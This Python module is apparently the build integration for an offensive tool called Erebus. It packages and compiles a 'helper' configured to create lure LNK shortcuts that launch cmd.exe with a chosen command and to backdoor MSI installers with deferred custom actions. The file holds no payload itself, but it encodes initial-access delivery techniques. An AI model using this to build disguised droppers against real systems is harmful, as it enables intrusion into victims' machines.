"""
Erebus Helper Integration Module for builder.py
This module provides integration points for the builder.py to configure and compile Erebus.Helper

Usage in builder.py:
    from erebus_wrapper.erebus.modules.archive.helper_integration import (
        ErebusHelperBuilder,
        compile_helper_with_config
    )
    
    helper_builder = ErebusHelperBuilder(build_params)
    helper_exe = helper_builder.build_and_compile()
"""

import json
import os
import subprocess
import tempfile
import logging
import shutil
from pathlib import Path
from typing import Dict, Any, Optional


logger = logging.getLogger("ErebusHelperBuilder")


class ErebusHelperBuilder:
    """Builds and compiles Erebus.Helper with user-selected configuration"""
    
    def __init__(self, build_parameters: Dict[str, Any]):
        """Initialize builder with build parameters from builder.py
        
        Args:
            build_parameters: Dictionary of build parameters from the wrapper payload type
        """
        self.build_parameters = build_parameters
        self.helper_root = Path(__file__).resolve().parents[3] / "agent_code" / "Erebus.Helper"
        if self._is_helper_config(build_parameters):
            self.config = self._normalize_helper_config(build_parameters)
        else:
            self.config = self._extract_helper_config()

    @staticmethod
    def _is_helper_config(build_parameters: Dict[str, Any]) -> bool:
        """Detect if provided parameters are already helper config."""
        config_keys = {"create_lnk", "create_msi", "backdoor_msi", "output_dir"}
        return any(key in build_parameters for key in config_keys)

    @staticmethod
    def _normalize_helper_config(config: Dict[str, Any]) -> Dict[str, Any]:
        """Ensure helper config has required defaults."""
        normalized = dict(config)
        normalized.setdefault("output_dir", ".")
        normalized.setdefault("create_lnk", False)
        normalized.setdefault("backdoor_msi", False)
        normalized.setdefault("create_msi", False)
        normalized.setdefault("plugin_configs", {})
        return normalized
    
    def _extract_helper_config(self) -> Dict[str, Any]:
        """Extract Erebus.Helper-specific configuration from build parameters
        
        Returns:
            Dict with helper configuration
        """
        config = {
            "output_dir": ".",
            "create_lnk": False,
            "backdoor_msi": False,
            "create_msi": False,
            "plugin_configs": {}
        }
        
        # LNK Trigger Configuration
        if self.build_parameters.get("0.9 Trigger Type") == "LNK":
            config["create_lnk"] = True
            config["lnk_name"] = self._generate_lnk_filename()
            config["target_binary"] = self.build_parameters.get("0.9a Trigger Binary", "cmd.exe")
            config["target_args"] = self.build_parameters.get("0.9b Trigger Command", "")
            config["icon_source"] = "C:\\Windows\\System32\\shell32.dll"
            config["icon_index"] = 0
        
        # MSI Backdooring Configuration
        if self.build_parameters.get("backdoor_msi"):
            config["backdoor_msi"] = True
            config["msi_source"] = self.build_parameters.get("msi_source_file")
            config["msi_install_scope"] = self.build_parameters.get("msi_install_scope", "perMachine")
            config["msi_action_type"] = self.build_parameters.get("msi_action_type", "execute_deferred")
        
        # MSI Container Creation
        if self.build_parameters.get("create_msi"):
            config["create_msi"] = True
            config["msi_install_scope"] = self.build_parameters.get("msi_install_scope", "perMachine")
        
        # Windows Plugin Configuration
        config["plugin_configs"] = self.build_parameters.get("windows_plugins", {})
        
        return config
    
    def _generate_lnk_filename(self) -> str:
        """Generate LNK filename based on configuration
        
        Returns:
            LNK filename with appropriate extension
        """
        base_name = self.build_parameters.get("trigger_name", "document")
        return f"{base_name}.lnk"
    
    def generate_config_json(self, output_path: Optional[Path] = None) -> Path:
        """Generate JSON configuration file for helper
        
        Args:
            output_path: Path to save config JSON (default: temp file)
        
        Returns:
            Path to generated config file
        """
        if output_path is None:
            temp_dir = Path(tempfile.gettempdir())
            output_path = temp_dir / "erebus_helper_config.json"
        
        with open(output_path, 'w') as f:
            json.dump(self.config, f, indent=2)
        
        logger.info(f"Generated config: {output_path}")
        return output_path

    def build_single_file_script(self, output_dir: Optional[Path] = None) -> Optional[Path]:
        """Build a single-file helper script with embedded configuration.

        Args:
            output_dir: Output directory for the helper script

        Returns:
            Path to generated helper script or None if failed
        """
        if output_dir is None:
            output_dir = Path(".")

        output_dir = Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        main_py = self.helper_root / "main.py"
        if not main_py.exists():
            logger.error(f"Main file not found: {main_py}")
            return None

        try:
            main_text = main_py.read_text(encoding="utf-8")
        except Exception as e:
            logger.error(f"Failed to read helper main.py: {e}")
            return None

        config_json = json.dumps(self.config)
        embedded_block = (
            "# Auto-generated by Erebus builder - embedded configuration\n"
            "import sys as _sys\n"
            "import json as _json\n"
            f"_sys.embedded_config = _json.loads({config_json!r})\n\n"
        )

        combined_text = self._inject_after_docstring(main_text, embedded_block)

        output_path = output_dir / "erebus_helper.py"
        try:
            output_path.write_text(combined_text, encoding="utf-8")
        except Exception as e:
            logger.error(f"Failed to write helper script: {e}")
            return None

        logger.info(f"Generated helper script: {output_path}")
        return output_path

    @staticmethod
    def _inject_after_docstring(source_text: str, block: str) -> str:
        """Inject a block of text after the module docstring if present."""
        stripped = source_text.lstrip()
        if stripped.startswith('"""') or stripped.startswith("'''"):
            quote = '"""' if stripped.startswith('"""') else "'''"
            start_idx = source_text.find(quote)
            end_idx = source_text.find(quote, start_idx + len(quote))
            if end_idx != -1:
                end_idx = end_idx + len(quote)
                return source_text[:end_idx] + "\n\n" + block + source_text[end_idx:]
        return block + source_text
    
    def compile_with_pyinstaller(self, output_dir: Optional[Path] = None) -> Optional[Path]:
        """Compile Erebus.Helper using PyInstaller via direct API
        
        Args:
            output_dir: Output directory for compiled executable
        
        Returns:
            Path to compiled executable or None if compilation failed
        """
        import os
        
        if output_dir is None:
            output_dir = Path(".")
        
        output_dir = Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)
        
        logger.info(f"Helper root: {self.helper_root}")
        logger.info(f"Output dir: {output_dir}")
        
        try:
            logger.info(f"Compiling Erebus.Helper with PyInstaller API...")
            
            # Import PyInstaller
            try:
                from PyInstaller.__main__ import run as pyinstaller_run  # type: ignore
                logger.info("PyInstaller API imported successfully")
            except ImportError as e:
                logger.error(f"Failed to import PyInstaller: {e}")
                logger.error("Please install PyInstaller: pip install pyinstaller")
                return None
            
            # Compile directly from main.py
            main_py = self.helper_root / "main.py"
            if not main_py.exists():
                logger.error(f"Main file not found: {main_py}")
                return None
            
            logger.info(f"Compiling from: {main_py}")
            
            # Create temporary build directory
            temp_build_dir = Path(tempfile.gettempdir()) / "erebus_helper_build"
            temp_build_dir.mkdir(parents=True, exist_ok=True)
            logger.info(f"Temp build dir: {temp_build_dir}")
            
            # Build PyInstaller arguments
            pyi_args = [
                str(main_py),
                "--onefile",
                "--console",
                f"--distpath={temp_build_dir / 'dist'}",
                f"--workpath={temp_build_dir / 'build'}",
                f"--specpath={temp_build_dir}",
                f"--name=erebus_helper",
            ]
            
            logger.info(f"PyInstaller arguments: {pyi_args}")
            
            # Store original working directory
            old_cwd = os.getcwd()
            result_returncode = 1
            
            try:
                # Change to helper root directory for compilation
                os.chdir(str(self.helper_root))
                logger.info(f"Changed working directory to: {os.getcwd()}")
                
                # Run PyInstaller
                logger.info("Starting PyInstaller compilation...")
                try:
                    pyinstaller_run(pyi_args)
                    logger.info("PyInstaller run completed successfully")
                    result_returncode = 0
                except SystemExit as e:
                    # PyInstaller uses SystemExit with code 0 on success
                    result_returncode = e.code if hasattr(e, 'code') else 0
                    logger.info(f"PyInstaller exited with code: {result_returncode}")
                except Exception as e:
                    logger.error(f"PyInstaller raised exception: {type(e).__name__}: {e}", exc_info=True)
                    result_returncode = 1
            finally:
                # Restore original working directory
                os.chdir(old_cwd)
                logger.info(f"Restored working directory to: {os.getcwd()}")
            
            if result_returncode != 0:
                logger.error(f"PyInstaller compilation failed with return code {result_returncode}")
                return None
            
            logger.info("PyInstaller compilation succeeded, looking for output...")
            
            # Look for compiled executable
            exe_paths_to_check = [
                temp_build_dir / "dist" / "erebus_helper.exe",
                temp_build_dir / "dist" / "erebus_helper",
            ]
            
            exe_path = None
            for path in exe_paths_to_check:
                logger.info(f"Checking: {path} (exists: {path.exists()})")
                if path.exists() and path.is_file():
                    file_size = path.stat().st_size
                    if file_size > 0:
                        exe_path = path
                        logger.info(f"Found executable: {exe_path} ({file_size} bytes)")
                        break
                    else:
                        logger.warning(f"Found but empty: {path}")
            
            if exe_path is None:
                logger.error("Compiled executable not found")
                dist_dir = temp_build_dir / "dist"
                if dist_dir.exists():
                    logger.error(f"Contents of {dist_dir}:")
                    try:
                        for item in dist_dir.iterdir():
                            if item.is_file():
                                logger.error(f"  - {item.name} ({item.stat().st_size} bytes)")
                            else:
                                logger.error(f"  - {item.name}/ (directory)")
                    except Exception as e:
                        logger.error(f"  Error listing: {e}")
                else:
                    logger.error(f"Dist directory not found: {dist_dir}")
                return None
            
            # Copy executable to output directory
            final_exe_path = output_dir / "erebus_helper.exe"
            logger.info(f"Copying to: {final_exe_path}")
            shutil.copy2(exe_path, final_exe_path)
            
            # Verify copy
            if not final_exe_path.exists():
                logger.error(f"Failed to copy: {final_exe_path}")
                return None
            
            final_size = final_exe_path.stat().st_size
            if final_size == 0:
                logger.error(f"Copied file is empty: {final_exe_path}")
                return None
            
            logger.info(f"Successfully compiled: {final_exe_path} ({final_size} bytes)")
            return final_exe_path
        
        except Exception as e:
            logger.error(f"Compilation error: {type(e).__name__}: {e}", exc_info=True)
            return None
    
    def build_and_compile(self, output_dir: Optional[Path] = None) -> Optional[Path]:
        """Build configuration and package helper script
        
        Args:
            output_dir: Output directory for compiled executable
        
        Returns:
            Path to compiled executable or None if failed
        """
        logger.info(f"Building Erebus.Helper with config: {self.config}")
        
        # Generate config file
        config_file = self.generate_config_json()
        
        # Build single-file helper script
        script_path = self.build_single_file_script(output_dir)

        if script_path:
            logger.info(f"Successfully packaged Erebus.Helper script: {script_path}")
            # Copy config file alongside script (for optional override)
            config_dest = script_path.parent / "erebus_config.json"
            shutil.copy2(config_file, config_dest)
            logger.info(f"Copied config to: {config_dest}")
            
            # Copy requirements.txt for dependency installation
            requirements_src = self.helper_root / "requirements.txt"
            if requirements_src.exists():
                requirements_dest = script_path.parent / "requirements.txt"
                shutil.copy2(requirements_src, requirements_dest)
                logger.info(f"Copied requirements.txt to: {requirements_dest}")
            
            return script_path
        else:
            logger.warning("Packaging failed, returning config file path only")
            if output_dir:
                # Copy config to output directory even if compilation failed
                config_dest = Path(output_dir) / "erebus_config.json"
                shutil.copy2(config_file, config_dest)
                logger.info(f"Copied config to: {config_dest}")
                return config_dest
            return config_file


def compile_helper_with_config(
    build_parameters: Dict[str, Any],
    output_dir: Optional[Path] = None
) -> Optional[Path]:
    """Convenience function to compile helper from build parameters
    
    Args:
        build_parameters: Build parameters dictionary
        output_dir: Output directory for compiled executable
    
    Returns:
        Path to compiled executable or None if failed
    """
    builder = ErebusHelperBuilder(build_parameters)
    return builder.build_and_compile(output_dir)
